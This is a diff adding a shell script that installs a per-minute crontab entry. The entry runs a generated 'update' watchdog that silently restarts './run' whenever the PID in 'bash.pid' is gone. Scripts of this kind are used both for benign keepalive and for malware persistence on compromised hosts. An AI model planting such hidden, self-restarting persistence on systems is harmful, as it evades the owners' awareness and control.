@@ -1,0 +1,17 @@
+#!/bin/sh
+pwd > new.dir
+dir=$(cat new.dir)
+echo "* * * * * $dir/update >/dev/null 2>&1" > cron.d
+crontab cron.d
+crontab -l | grep update
+echo "#!/bin/sh
+if test -r $dir/bash.pid; then
+pid=\$(cat $dir/bash.pid)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+cd $dir
+./run &>/dev/null" > update
+chmod u+x update
